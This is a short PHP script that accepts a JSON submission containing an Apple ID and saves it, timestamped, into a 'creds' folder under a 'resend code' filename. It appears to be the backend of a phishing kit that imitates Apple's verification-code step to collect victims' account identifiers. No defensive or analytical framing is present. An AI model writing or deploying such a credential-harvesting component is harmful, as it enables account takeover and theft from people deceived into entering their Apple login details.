<?php
header('Content-Type: application/json');

$input = file_get_contents('php://input');
$data = json_decode($input, true);

$appleid = $data['appleid'] ?? 'unknown';
$timestamp = date('Y-m-d_H-i-s');

$credsDir = dirname(__DIR__) . '/creds';
if (!file_exists($credsDir)) {
    mkdir($credsDir, 0755, true);
}

file_put_contents($credsDir . '/resend_code_' . $timestamp . '.txt', "Apple ID: {$appleid}\nTimestamp: {$timestamp}\n");

echo json_encode(['status' => 'success']);